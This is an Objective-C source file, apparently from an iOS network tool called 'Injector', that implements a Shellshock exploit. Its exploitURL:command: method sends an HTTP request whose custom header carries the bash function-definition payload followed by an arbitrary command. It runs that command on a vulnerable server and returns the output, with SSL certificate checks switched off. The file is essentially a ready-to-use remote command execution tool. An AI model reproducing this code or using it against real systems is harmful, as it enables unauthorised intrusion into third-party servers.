//
//  IJTShellshock.m
//  
//
//  Created by 聲華 陳 on 2016/1/1.
//
//

#import "IJTShellshock.h"
#import <curl/curl.h>

@implementation IJTShellshock

- (id)init {
    self = [super init];
    if(self) {
        curl_global_init(CURL_GLOBAL_SSL);
    }
    return self;
}

- (void)dealloc {
    curl_global_cleanup();
}

- (NSString *)exploitURL: (NSString *)urlString command: (NSString *)command timeout: (u_int32_t)timeout error: (NSString **)error {
    CURL *handle = curl_easy_init();
    CURLcode code;
    struct curl_slist *chunk = NULL;
    NSMutableString *replyMessage = [[NSMutableString alloc] init];
    NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
    NSString *majorVersion = [infoDictionary objectForKey:@"CFBundleShortVersionString"];
    
    if(!handle) {
        if(error) {
            *error = [NSString stringWithUTF8String:strerror(ENOBUFS)];
        }//end if
        return @"";
    }//end if
    
    //set header
    chunk = curl_slist_append(chunk, "Accept: */*");
    chunk = curl_slist_append(chunk, [[NSString stringWithFormat:@"User-Agent: Injector-%@", majorVersion] UTF8String]);
    chunk = curl_slist_append(chunk, [[NSString stringWithFormat:@"Injector: () { :; }; %@", command] UTF8String]);
    
    curl_easy_setopt(handle, CURLOPT_HTTPHEADER, chunk);
    
    //set url
    curl_easy_setopt(handle, CURLOPT_URL, [urlString UTF8String]);
    
    // support basic, digest, and NTLM authentication
    curl_easy_setopt(handle, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
    
    // try not to use signals
    curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
    
    //ignore SSL certificate
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
    
    //read callback
    curl_easy_setopt(handle, CURLOPT_WRITEFUNCTION, readCallback);
    curl_easy_setopt(handle, CURLOPT_WRITEDATA, replyMessage);
    
    //timeout
    curl_easy_setopt(handle, CURLOPT_TIMEOUT_MS, timeout);
    
    code =
    curl_easy_perform(handle);
    
    //free http header
    curl_slist_free_all(chunk);
    
    if(code != CURLE_OK) {
        if(error) {
            *error = [NSString stringWithUTF8String:curl_easy_strerror(code)];
        }//end if
        return @"";
    }//end if
    else {
        if(error) {
            *error = @"";
        }//end if
        return replyMessage;
    }//end else ok
}

static size_t readCallback(char *ptr, size_t size, size_t nmemb, void *userdata) {
    NSMutableString *replyMessage = (__bridge NSMutableString *)userdata;
    [replyMessage appendString:[[NSString alloc] initWithBytes:ptr length:nmemb encoding:NSUTF8StringEncoding]];
    
    return nmemb;
}


@end
